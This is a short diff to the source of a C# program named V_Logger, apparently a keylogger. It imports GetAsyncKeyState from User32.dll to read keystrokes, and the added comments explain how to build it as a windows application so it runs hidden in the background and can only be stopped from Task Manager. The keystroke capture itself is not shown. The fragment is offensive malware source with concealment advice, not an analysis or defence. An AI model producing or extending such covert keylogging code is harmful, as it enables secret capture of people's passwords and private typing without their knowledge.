@@ -9,6 +9,10 @@ namespace V_Logger
 {
     class Program
     {
+        //Set the application properties to windows application, then the program remain hidden in background.
+        //you can shut down it in the task manager, finding its name
+
+
         [DllImport("User32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
 
